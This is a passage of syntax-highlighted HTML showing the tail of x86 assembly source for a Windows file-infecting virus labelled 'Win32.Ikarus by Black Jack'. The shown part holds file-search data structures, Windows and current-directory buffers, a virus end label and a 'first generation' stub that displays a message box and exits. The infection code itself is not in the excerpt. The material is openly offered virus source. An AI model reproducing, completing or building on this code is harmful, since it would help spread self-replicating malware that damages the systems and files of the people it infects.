</span><span class="sc5">LastAccessTime</span><span class="sc0">          </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LastWriteTime</span><span class="sc0">           </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileSize</span><span class="sc0">                </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wfd_reserved</span><span class="sc0">            </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileName</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">DosFileName</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">windir</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">curdir</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">



</span><span class="sc5">virus_virtual_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">quit_first_gen</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">caption</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">message</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc5">caption</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Win32.Ikarus by Black Jack"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">message</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"first genertion virus sample"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">
</span></div></body>
</html>
